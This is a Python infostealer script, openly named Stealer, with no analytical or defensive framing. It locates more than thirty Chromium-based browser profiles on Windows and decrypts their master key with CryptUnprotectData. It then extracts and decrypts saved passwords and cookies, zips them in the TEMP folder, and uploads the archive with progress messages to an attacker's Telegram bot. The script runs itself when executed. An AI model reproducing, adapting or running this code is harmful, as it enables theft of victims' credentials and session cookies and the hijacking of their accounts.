# -*- coding: utf-8 -*-
import traceback
import sys
import os
import json
import base64
import sqlite3
import win32crypt
from Crypto.Cipher import AES
import shutil
from datetime import datetime
import getpass
import requests
from zipfile import ZipFile
class Stealer():
	def __init__(self):
		try:
			self.token = sys.argv[1]
			self.chat_id = sys.argv[2]
			self.SendMessage("%F0%9F%93%8C Enumerating...")
			self.result = Chromium(self).Main()
			self.SendMessage("%F0%9F%93%8C Saveing...")
			self.Save()
			self.SendMessage("%F0%9F%93%8C Sending File...")
			self.Zip_Folder()
		except:
			self.SendMessage("✖️ Stealer Error : \n ❖ Message : " + traceback.format_exc())
	def Zip_Folder(self):
		dirname = os.environ['TEMP'] + "\\" + os.environ['USERNAME'] + "\\"
		output = os.environ['TEMP'] + "\\" + os.environ['USERNAME'] + '.zip'
		file = ZipFile(output, 'w')
		for folderName, subfolders, filenames in os.walk(dirname):
			for filename in filenames:
				filePath = os.path.join(folderName, filename)
				file.write(filePath, "\\".join(filePath.split("\\")[-2:len(filePath.split("\\"))]))
		file.close()
		self.Send_File(output)
	def Save(self):
		dirname = os.environ['TEMP'] + "\\" + os.environ['USERNAME'] + "\\"
		if os.path.exists(dirname):
			shutil.rmtree(dirname,True)
		os.mkdir(dirname)
		# Save Passwords
		for browser in self.result.keys():
			outdir = dirname + browser + "\\"
			os.mkdir(outdir)
			if "Passwords" in self.result[browser].keys():
				filename = outdir + "Passwords.txt"
				file = open(filename,"w")
				for item in self.result[browser]["Passwords"]:
					try:
						url = str(item['URL'])
					except:
						url = ""
					try:
						username = str(item['Username'])
					except:
						username = ""
					try:
						password = str(item['Password'])
					except:
						password = ""
					file.write("URL : " + url + "\n")
					file.write("Username : " + username + "\n")
					file.write("Password : " + password + "\n\n")
			if "Cookies" in self.result[browser].keys():
				filename = outdir + "Cookies.txt"
				file = open(filename,"w")
				file.write(json.dumps(self.result[browser]["Cookies"]))
				file.close()
	def Request(self,url):
		return requests.get(url).text.encode("utf-8")
	def Send_File(self,filename):
		url = "https://api.telegram.org/bot" + self.token + "/sendDocument?caption=--" + getpass.getuser() + "--&chat_id=" + self.chat_id
		requests.get(url, files={'document':open(filename,'rb')})
	def SendMessage(self,message):
		self.Request("https://api.telegram.org/bot" + self.token + "/sendMessage?text=" + message + "\n--" + getpass.getuser() + "--&chat_id=" + self.chat_id)

class Chromium():
	def __init__(self,main_self):
		self.main_self = main_self
		self.browsers = {
			"Edge Chromium" :  r"AppData\Local\Microsoft\Edge\User Data\Default",
			"Chrome" : r"AppData\Local\Google\Chrome\User Data\Default",
			"Opera" : r"AppData\Roaming\Opera Software\Opera Stable",
			"Yandex" : r"AppData\Local\Yandex\YandexBrowser\User Data\Default",
			"360 Browser" : r"AppData\Local\360Chrome\Chrome\User Data\Default",
			"Comodo Dragon" : r"AppData\Local\Comodo\Dragon\User Data\Default",
			"CoolNovo" : r"AppData\Local\MapleStudio\ChromePlus\User Data\Default",
			"Torch Browser" : r"AppData\Local\Torch\User Data\Default",
			"Brave Browser" : r"AppData\Local\BraveSoftware\Brave-Browser\User Data\Default",
			"Iridium Browser" : r"AppData\Local\Iridium\User Data\Default",
			"7Star" : r"AppData\Local\7Star\7Star\User Data\Default",
			"Amigo" : r"AppData\Local\Amigo\User Data\Default",
			"CentBrowser" : r"AppData\Local\CentBrowser\User Data\Default",
			"Chedot" : r"AppData\Local\Chedot\User Data\Default",
			"CocCoc" : r"AppData\Local\CocCoc\Browser\User Data\Default",
			"Elements Browser" : r"AppData\Local\Elements Browser\User Data\Default",
			"Epic Privacy Browser" : r"AppData\Local\Epic Privacy Browser\User Data\Default",
			"Kometa" : r"AppData\Local\Kometa\User Data\Default",
			"K-Melon" : r"AppData\Local\K-Melon\User Data\Default",
			"360Browser" : r"AppData\Local\360Browser\Browser\User Data\Default",
			"Nichrome" : r"AppData\Local\Nichrome\User Data\Default",
			"Orbitum" : r"AppData\Local\Orbitum\User Data\Default",
			"Maxthon3" : r"AppData\Local\Maxthon3\User Data\Default",
			"Sputnik" : r"AppData\Local\Sputnik\Sputnik\User Data\Default",
			"Chromodo" : r"AppData\Local\Chromodo\User Data\Default",
			"uCozMedia" : r"AppData\Local\uCozMedia\Uran\User Data\Default",
			"Vivaldi" : r"AppData\Local\Vivaldi\User Data\Default",
			"Sleipnir 6" : r"AppData\Local\Fenrir Inc\Sleipnir5\setting\modules\ChromiumViewer",
			"Citrio" : r"AppData\Local\CatalinaGroup\Citrio\User Data\Default",
			"Coowon" : r"AppData\Local\Coowon\Coowon\User Data\Default",
			"Liebao Browser" : r"AppData\Local\liebao\User Data\Default",
			"QIP Surf" : r"AppData\Local\QIP Surf\User Data\Default",
		}
		self.json = {}
	def Main(self):
		# Enumerate Passwords
		self.Passwords()
		self.Cookies()
		# Return Json
		return self.json

	# Enumerate Passwords
	def Passwords(self):
		for browser in self.browsers.keys():
			filename = os.environ['USERPROFILE'] + os.sep + self.browsers[browser]
			if os.path.exists(filename):
				master_key = self.get_master_key(filename)
				if master_key == None:
					continue
				login_db = filename + r'\Login Data'
				if os.path.exists(login_db):
					shutil.copy2(login_db, os.environ['TEMP'] + "\\" + "Database.db")
					conn = sqlite3.connect(os.environ['TEMP'] + "\\" + "Database.db")
					cursor = conn.cursor()
					result = []
					try:
						cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
						for r in cursor.fetchall():
							url = r[0]
							username = r[1]
							encrypted_password = r[2]
							decrypted_password = self.decrypt_password(encrypted_password, master_key)
							if username != "" or decrypted_password != "":
								data = {}
								data['URL'] = url
								data['Username'] = username
								data['Password'] = decrypted_password
								result.append(data)
					except Exception as e:
						pass
					cursor.close()
					conn.close()
					if result:
						if browser not in self.json.keys():
							self.json[browser] = {}
						self.json[browser].update({'Passwords' : result})
					try:
						os.remove(os.environ['TEMP'] + "\\" + "Database.db")
					except Exception as e:
						pass

	# Enumerate Cookies
	def Cookies(self):
		for browser in self.browsers.keys():
			dirname = os.environ['USERPROFILE'] + os.sep + self.browsers[browser]
			if os.path.exists(dirname):
				master_key = self.get_master_key(dirname)
				if master_key == None:
					continue
				cookies_db = dirname + r'\Cookies'
				if os.path.exists(cookies_db):
					shutil.copy2(cookies_db,os.environ['TEMP'] + "\\" + "Database.db")
					conn = sqlite3.connect(os.environ['TEMP'] + "\\" + "Database.db")
					cursor = conn.cursor()
					result = []
					try:
						cursor.execute("SELECT host_key, path, is_secure, last_access_utc, name, encrypted_value, is_persistent FROM cookies")
						for r in cursor.fetchall():
							decrypted_password = self.decrypt_password(r[5], master_key)
							data = {}
							data['domain'] = r[0]
							data['httpOnly'] = bool(1)
							data['path'] = r[1]
							data['secure'] = bool(int(r[2]))
							data['expirationDate'] = r[3]
							data['name'] = r[4]
							data['value'] = decrypted_password
							data['storeId'] = str(1)
							result.append(data)
					except Exception as e:
						pass
					cursor.close()
					conn.close()
					if browser not in self.json.keys():
						self.json[browser] = {}
					self.json[browser].update({'Cookies': result})
					try:
						os.remove(os.environ['TEMP'] + "\\" + "Database.db")
					except Exception as e:
						pass
	def decrypt_password(self, buff, master_key):
		try:
			iv = buff[3:15]
			payload = buff[15:]
			cipher = AES.new(master_key, AES.MODE_GCM, iv)
			decrypted_pass = cipher.decrypt(payload)
			decrypted_pass = decrypted_pass[:-16].decode()
			return decrypted_pass
		except:
			pass

	def get_master_key(self,dir):
		dirs = [dir ,"\\".join(dir.split("\\")[0:-1])]
		found = True
		for i in dirs:
			if os.path.exists(i + r"\Local State"):
				file = open(i + r"\Local State","r")
				local_state = json.loads(file.read())
				try:
					master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
					master_key = master_key[5:]
					master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
					return master_key
				except:
					pass
		self.main_self.SendMessage("✖️ Stealer Error : \n ❖ Failed Enumerate Master Key : " + dir)
		return None
class Firefox():
	def __init__(self):
		self.browsers = {}
		self.json = {}
	
Stealer()
